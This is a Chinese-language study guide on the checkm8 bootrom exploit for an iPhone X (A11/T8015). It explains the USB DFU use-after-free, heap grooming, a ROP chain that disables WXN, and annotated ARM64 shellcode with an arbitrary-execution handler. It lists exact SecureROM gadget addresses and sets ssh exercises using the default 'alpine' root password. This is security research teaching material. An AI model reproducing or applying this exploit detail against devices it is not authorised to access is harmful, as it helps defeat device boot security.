# 阶段 1：SecureROM 与 checkm8 深度学习指南

> 学习目标：理解 checkm8 bootrom exploit 的工作原理，掌握从硬件层面分析 iOS 安全机制的能力

---

## 📋 学习概览

| 项目 | 内容 |
|------|------|
| **你的设备** | iPhone X (A11 Bionic / T8015) |
| **iOS 版本** | 12.3.1 (Build 16F203) |
| **越狱类型** | checkra1n (bootrom exploit) |
| **学习周期** | 建议 2-3 周 |
| **前置知识** | ARM64 汇编基础、C 语言、USB 协议基础 |

---

## 🏗️ 知识架构

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         iOS 启动链安全模型                               │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│   硬件层          固件层           内核层          用户层                 │
│   ┌─────┐       ┌─────┐         ┌─────┐        ┌─────┐                 │
│   │Secure│──────▶│iBoot│────────▶│ XNU │───────▶│Apps │                 │
│   │ ROM  │       │     │         │     │        │     │                 │
│   └─────┘       └─────┘         └─────┘        └─────┘                 │
│      │                                                                  │
│      ▼                                                                  │
│   checkm8 在这里攻击                                                     │
│   (永久不可修补)                                                         │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 📚 第一周：理论基础

### 1.1 SecureROM 基础概念

**学习内容：**
- 什么是 SecureROM (BootROM)
- 为什么 SecureROM 漏洞无法通过软件修复
- iOS 安全启动链 (Secure Boot Chain)
- DFU 模式的作用和原理

**阅读材料：**
```
checkra1n_research/ipwndfu/README.md
checkra1n_research/ipwndfu/JAILBREAK-GUIDE.md
```

**关键概念笔记：**

| 概念 | 说明 |
|------|------|
| SecureROM | 烧录在芯片中的只读代码，设备上电后第一个执行 |
| DFU Mode | Device Firmware Upgrade，允许通过 USB 恢复设备 |
| CPID | Chip ID，标识芯片型号 (你的设备: 0x8015) |
| SRTG | SecureROM Tag，标识 iBoot 版本 |
| ECID | Exclusive Chip ID，每台设备唯一 |

### 1.2 ARM64 汇编基础

**必须掌握的指令：**

```asm
; 数据传输
LDR  X0, [X1]        ; 从内存加载
STR  X0, [X1]        ; 存储到内存
MOV  X0, X1          ; 寄存器间移动
STP  X0, X1, [SP]    ; 存储寄存器对
LDP  X0, X1, [SP]    ; 加载寄存器对

; 分支跳转
B    label           ; 无条件跳转
BL   label           ; 带链接跳转 (函数调用)
BLR  X0              ; 跳转到寄存器地址
RET                  ; 返回
CBZ  X0, label       ; 为零则跳转
CBNZ X0, label       ; 非零则跳转

; 系统寄存器
MSR  SCTLR_EL1, X0   ; 写系统控制寄存器
MRS  X0, SCTLR_EL1   ; 读系统控制寄存器

; 缓存操作
DC   CIVAC, X0       ; 清理并无效化数据缓存
DSB  SY              ; 数据同步屏障
ISB                  ; 指令同步屏障
```

---

## 🔬 第二周：checkm8 源码分析

### 2.1 T8015 (A11) 内存布局

你的设备 (iPhone X) 的 SecureROM 内存布局：

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    SecureROM 内存映射 (A11/T8015)                        │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  ROM 区域 (只读，烧录在芯片中)                                            │
│  ═══════════════════════════════                                        │
│  0x100000000    SecureROM 代码起始                                       │
│  0x1000003EC    write_sctlr_gadget    - 写 SCTLR 的 gadget              │
│  0x10000045C    write_ttbr0           - 写页表基址寄存器                  │
│  0x1000004AC    tlbi                  - TLB 无效化                       │
│  0x1000004D0    dc_civac              - 数据缓存清理                      │
│  0x1000004F0    dmb                   - 数据内存屏障                      │
│  0x10000945C    load_write_gadget     - 加载/写入 gadget                 │
│  0x10000A9AC    func_gadget           - 函数调用 gadget                  │
│  0x10000AE80    usb_create_string_descriptor                            │
│  0x10000B9A8    USB_CORE_DO_IO        - USB I/O 核心函数                 │
│  0x10000BCCC    handle_interface_request - USB 请求处理                  │
│                                                                         │
│  SRAM 区域 (可读写)                                                      │
│  ═══════════════════════════════                                        │
│  0x180000000    SRAM 起始                                               │
│  0x1800008FA    gUSBSRNMStringDescriptor                                │
│  0x180003A78    gUSBSerialNumber      - USB 序列号存储                   │
│  0x180008528    gUSBDescriptors       - USB 描述符表                     │
│  0x180008638    PAYLOAD_PTR           - payload 指针                    │
│  0x18001BC00    PAYLOAD_DEST          - shellcode 目标地址              │
│  0x18001C000    LOAD_ADDRESS          - 主加载地址                       │
│  0x18001C020    ROP callback 数据区                                     │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### 2.2 漏洞原理：USB DFU Use-After-Free

**核心文件：** `checkra1n_research/ipwndfu/checkm8.py`

**漏洞类型：** Use-After-Free (UAF)

**触发流程：**

```
阶段 1: 准备 (Heap Feng Shui)
════════════════════════════
┌─────────────────────────────────────────────────────────────┐
│  stall()     发送 USB 请求但立即取消                         │
│              → 在堆上留下悬挂指针 (dangling pointer)         │
│                                                             │
│  no_leak()   分配/释放内存，创建特定大小的空洞               │
│  × 6 次      → 堆布局被精心安排                              │
│                                                             │
│  leak()      泄漏一个分配                                    │
│              → 为后续覆盖做准备                              │
└─────────────────────────────────────────────────────────────┘

阶段 2: 触发 (Trigger UAF)
════════════════════════════
┌─────────────────────────────────────────────────────────────┐
│  usb_reset() USB 总线重置                                    │
│              → 释放 USB 请求结构，但悬挂指针仍然存在          │
│                                                             │
│  重新连接    设备重新枚举                                    │
│              → 新的 USB 请求会复用之前释放的内存              │
└─────────────────────────────────────────────────────────────┘

阶段 3: 利用 (Exploitation)
════════════════════════════
┌─────────────────────────────────────────────────────────────┐
│  发送 0x800  DFU_DNLOAD 请求                                 │
│  字节数据    → 数据被写入已释放但仍被引用的内存               │
│                                                             │
│  overwrite   覆盖控制结构                                    │
│              → 劫持函数指针                                  │
│                                                             │
│  payload     发送 shellcode                                 │
│              → 代码被放置在 PAYLOAD_DEST                     │
│                                                             │
│  usb_reset() 再次重置                                        │
│              → 触发被劫持的函数指针，执行 ROP 链             │
└─────────────────────────────────────────────────────────────┘
```

### 2.3 ROP 链分析 (T8015)

**文件位置：** `checkm8.py:403-417`

```python
t8015_callbacks = [
    # 步骤 1-3: 清理数据缓存，确保内存一致性
    (t8015_dc_civac, 0x18001C800),      # DC CIVAC 清理缓存行
    (t8015_dc_civac, 0x18001C840),
    (t8015_dc_civac, 0x18001C880),

    # 步骤 4: 数据内存屏障
    (t8015_dmb, 0),                      # DMB SY

    # 步骤 5: ★ 关键 - 禁用 WXN (Write XOR Execute)
    (t8015_write_sctlr_gadget, 0x100D), # MSR SCTLR_EL1, X0
    #                          ↑
    #                          0x100D = 禁用 WXN 位

    # 步骤 6-7: 设置页表
    (t8015_load_write_gadget, 0x18001C000),
    (t8015_load_write_gadget, 0x18001C010),

    # 步骤 8-9: 修改 TTBR0 并刷新 TLB
    (t8015_write_ttbr0, 0x180020000),   # 新页表基址
    (t8015_tlbi, 0),                     # TLB 无效化

    # 步骤 10-12: 继续设置
    (t8015_load_write_gadget, 0x18001C020),
    (t8015_write_ttbr0, 0x18000C000),
    (t8015_tlbi, 0),

    # 步骤 13: 跳转到 shellcode
    (0x18001C800, 0),                    # 执行我们的代码
]
```

### 2.4 Shellcode 分析

**文件位置：** `checkra1n_research/ipwndfu/src/`

#### checkm8_arm64.S - 主 shellcode

```asm
; 功能：修改 USB 描述符，复制 payload handler

_main:
  MOV  X19, #0                    ; 标记：不释放此 USB 请求
  STP  X29, X30, [SP,#-0x10]!     ; 保存帧指针和返回地址
  MOV  X29, SP

  ; 1. 修改 USB 描述符
  LDR  X0, =gUSBDescriptors
  LDP  X0, X1, [X0]
  ADR  X2, USB_DESCRIPTOR
  ; ... 复制新的描述符

  ; 2. 在序列号后追加 "PWND:[checkm8]"
  LDR  X0, =gUSBSerialNumber
find_zero_loop:
  ADD  X0, X0, #1
  LDRB W1, [X0]
  CBNZ W1, find_zero_loop
  ADR  X1, PWND_STRING
  ; ... 追加字符串

  ; 3. 复制 payload handler 到目标地址
  LDR  X0, =PAYLOAD_DEST
  ; ... 复制循环

  ; 4. 清理缓存，确保代码可执行
  DC   CIVAC, X0
  DMB  SY
  SYS  #0, c7, c5, #0             ; 指令缓存无效化
  DSB  SY
  ISB

  RET
```

#### usb_0xA1_2_arm64.S - USB 请求处理 handler

```asm
; 功能：处理特殊的 USB 请求 (0xA1)，提供代码执行接口

_main:
  LDRH W2, [X0]
  CMP  W2, #0x2A1                 ; 检查是否是我们的特殊请求
  BNE  jump_back

  ; 检查命令类型
  LDR  X0, [X20]
  LDR  X1, =EXEC_MAGIC            ; 0x6578656365786563 ("execexec")
  CMP  X0, X1
  BNE  not_exec

  ; EXEC: 执行任意函数
  LDR  X8, [X20, #0x8]            ; 函数地址
  LDR  X0, [X20, #0x10]           ; 参数 1
  ; ... 加载更多参数
  BLR  X8                         ; 调用函数

not_exec:
  LDR  X1, =MEMC_MAGIC            ; 0x6D656D636D656D63 ("memcmemc")
  CMP  X0, X1
  BNE  not_memc

  ; MEMC: 内存复制
  BL   memcpy

not_memc:
  LDR  X1, =MEMS_MAGIC            ; 0x6D656D736D656D73 ("memsmems")
  ; MEMS: 内存设置
  BL   memset
```

#### t8010_t8011_disable_wxn_arm64.S - 禁用 W^X 保护

```asm
; 功能：禁用 WXN (Write XOR Execute) 保护
; 这允许同一内存页同时可写和可执行

_main:
  MOV  X1, #0x180000000
  ADD  X2, X1, #0xA0000
  ADD  X1, X1, #0x625
  STR  X1, [X2,#0x600]
  DMB  SY

  MOV  X0, #0x100D                ; SCTLR_EL1 新值
  MSR  SCTLR_EL1, X0              ; 写入系统控制寄存器
  DSB  SY
  ISB

  RET
```

---

## 🛠️ 第三周：硬件实践作业

### 作业 1：验证设备硬件信息

**目标：** 确认你的设备与 checkm8 配置匹配

```bash
# 在你的 Mac 终端执行：

# 1. 获取芯片 ID
sshpass -p 'alpine' ssh -p 2222 root@localhost \
  "ioreg -p IODeviceTree -l | grep 'chip-id'"

# 预期输出：chip-id = <15800000>  (0x8015 = T8015 = A11)

# 2. 获取 board ID
sshpass -p 'alpine' ssh -p 2222 root@localhost \
  "ioreg -p IODeviceTree -l | grep 'board-id'"

# 预期输出：board-id = <0e000000>  (0x0e = D221AP = iPhone X Global)

# 3. 验证 checkra1n 标记
sshpass -p 'alpine' ssh -p 2222 root@localhost \
  "ioreg -l | grep checkra1n"

# 4. 查看内核版本
sshpass -p 'alpine' ssh -p 2222 root@localhost \
  "sysctl kern.version"

# 预期：Darwin Kernel Version 18.6.0 ... xnu-4903.262.2
```

**记录你的结果：**
```
chip-id:    _______________
board-id:   _______________
platform:   _______________
XNU 版本:   _______________
```

---

### 作业 2：分析 checkm8 地址常量

**目标：** 理解 T8015 配置中每个地址的含义

打开 `checkra1n_research/ipwndfu/checkm8.py`，找到 T8015 配置 (第 376-424 行)。

**填写下表：**

| 常量名 | 地址值 | 用途说明 |
|--------|--------|----------|
| LOAD_ADDRESS | 0x18001C000 | |
| gUSBDescriptors | 0x180008528 | |
| gUSBSerialNumber | 0x180003A78 | |
| usb_create_string_descriptor | 0x10000AE80 | |
| PAYLOAD_DEST | 0x18001BC00 | |
| USB_CORE_DO_IO | 0x10000B9A8 | |
| handle_interface_request | 0x10000BCCC | |
| write_sctlr_gadget | 0x1000003EC | |
| write_ttbr0 | 0x10000045C | |

**思考题：**
1. 为什么 ROM 区域 (0x100000000) 的地址和 SRAM 区域 (0x180000000) 不同？
2. gadget 地址为什么都在 ROM 区域？
3. PAYLOAD_DEST 为什么在 SRAM 区域？

---

### 作业 3：追踪 exploit 执行流程

**目标：** 在设备上验证 checkm8 的执行结果

```bash
# 1. 检查 USB 序列号是否包含 PWND 标记
# (这是 checkm8 成功的标志)
sshpass -p 'alpine' ssh -p 2222 root@localhost \
  "ioreg -l | grep -i 'serial' | head -5"

# 2. 检查 checkra1n ramdisk 挂载
sshpass -p 'alpine' ssh -p 2222 root@localhost \
  "mount | grep -E 'checkra1n|disk4|disk5'"

# 3. 查看 checkra1n 提供的工具
sshpass -p 'alpine' ssh -p 2222 root@localhost \
  "ls -la /binpack/usr/local/bin/"

# 4. 使用 jtool2 分析一个系统二进制
sshpass -p 'alpine' ssh -p 2222 root@localhost \
  "/binpack/usr/local/bin/jtool2 -l /bin/ls | head -20"
```

---

### 作业 4：分析 ARM64 shellcode

**目标：** 手动反汇编并理解 shellcode

**步骤 1：** 阅读 `src/checkm8_arm64.S`

**步骤 2：** 回答以下问题

1. `PWND_STRING` 的内容是什么？它被追加到哪里？

2. 为什么需要执行 `DC CIVAC` 和 `DSB SY`？

3. `SYS #0, c7, c5, #0` 这条指令的作用是什么？

**步骤 3：** 在设备上验证

```bash
# 检查 USB 序列号是否包含 PWND 字符串
sshpass -p 'alpine' ssh -p 2222 root@localhost \
  "ioreg -l | grep -i pwnd"
```

---

### 作业 5：理解 ROP 链

**目标：** 分析 T8015 ROP 链的每一步

**绘制 ROP 链执行流程图：**

```
开始
  │
  ▼
┌─────────────────────┐
│ dc_civac (清理缓存)  │
└─────────────────────┘
  │
  ▼
┌─────────────────────┐
│ dmb (内存屏障)       │
└─────────────────────┘
  │
  ▼
┌─────────────────────┐
│ write_sctlr (禁用WXN)│ ← 为什么这一步是关键？
└─────────────────────┘
  │
  ▼
  ... (继续绘制)
```

**思考题：**
1. 为什么要禁用 WXN？如果不禁用会怎样？
2. 为什么要修改 TTBR0？
3. 为什么要执行 TLBI？

---

### 作业 6：对比不同芯片的配置

**目标：** 理解为什么每个芯片需要不同的地址

在 `checkm8.py` 中比较 T8010、T8011、T8015 的配置：

| 项目 | T8010 (A10) | T8011 (A10X) | T8015 (A11) |
|------|-------------|--------------|-------------|
| LOAD_ADDRESS | | | 0x18001C000 |
| USB_CORE_DO_IO | | | 0x10000B9A8 |
| hole 值 | 5 | 6 | 6 |
| leak 值 | 1 | 1 | 1 |

**思考题：**
1. 为什么不同芯片的地址不同？
2. hole 和 leak 值的含义是什么？
3. 这些值是如何确定的？

---

### 作业 7：实践 - 使用 jtool2 分析 kernelcache

**目标：** 学习使用 checkra1n 提供的分析工具

```bash
# 1. 查看 kernelcache 头信息
sshpass -p 'alpine' ssh -p 2222 root@localhost \
  "/binpack/usr/local/bin/jtool2 -h \
   /System/Library/Caches/com.apple.kernelcaches/kernelcache"

# 2. 列出所有内核扩展 (kext)
sshpass -p 'alpine' ssh -p 2222 root@localhost \
  "/binpack/usr/local/bin/jtool2 -k \
   /System/Library/Caches/com.apple.kernelcaches/kernelcache" | head -30

# 3. 找到安全相关的 kext
sshpass -p 'alpine' ssh -p 2222 root@localhost \
  "/binpack/usr/local/bin/jtool2 -k \
   /System/Library/Caches/com.apple.kernelcaches/kernelcache" | \
   grep -iE 'amfi|sandbox|trust|security'

# 4. 查看某个二进制的 entitlements
sshpass -p 'alpine' ssh -p 2222 root@localhost \
  "/binpack/usr/local/bin/jtool2 --ent /Applications/Cydia.app/Cydia"
```

**记录你发现的安全相关 kext：**
```
1. _______________
2. _______________
3. _______________
4. _______________
```

---

### 作业 8：追踪系统调用

**目标：** 使用 checkra1n 工具观察系统行为

```bash
# 1. 使用 fs_usage 追踪文件系统活动 (运行 5 秒)
sshpass -p 'alpine' ssh -p 2222 root@localhost \
  "timeout 5 /binpack/usr/bin/fs_usage 2>&1 | head -50"

# 2. 使用 sc_usage 查看系统调用统计
sshpass -p 'alpine' ssh -p 2222 root@localhost \
  "/binpack/usr/bin/sc_usage -E 2>&1 | head -30"

# 3. 查看进程列表
sshpass -p 'alpine' ssh -p 2222 root@localhost \
  "ps aux | head -20"
```

---

## 📝 阶段 1 总结检查清单

完成所有作业后，确认你能回答以下问题：

- [ ] 什么是 SecureROM？为什么它的漏洞无法修复？
- [ ] checkm8 利用的是什么类型的漏洞？
- [ ] Use-After-Free 漏洞是如何被触发的？
- [ ] ROP 链的作用是什么？
- [ ] 为什么要禁用 WXN？
- [ ] SCTLR_EL1 寄存器控制什么？
- [ ] TTBR0 寄存器的作用是什么？
- [ ] shellcode 是如何被执行的？
- [ ] 你的设备 (T8015) 的内存布局是怎样的？

---

## 🔗 参考资源

### 必读
- checkm8 原始公告: https://github.com/axi0mX/ipwndfu
- pongoOS 文档: https://github.com/checkra1n/pongoOS

### 推荐阅读
- ARM Architecture Reference Manual (ARMv8-A)
- Apple Platform Security Guide
- iOS Hacker's Handbook

### 工具
- jtool2: Mach-O 分析工具 (已在设备上)
- Hopper/IDA: 反汇编器 (可选)

---

## ➡️ 下一阶段预告

**阶段 2：pongoOS 与内核补丁**

学习内容：
- pongoOS 预启动环境
- Kernel Patchfinder (KPF) 原理
- AMFI/Sandbox 补丁分析
- 从 checkm8 到完整越狱的桥梁

---

*文档版本: 1.0*
*创建日期: 2026-02-02*
*适用设备: iPhone X (A11/T8015) iOS 12.3.1*
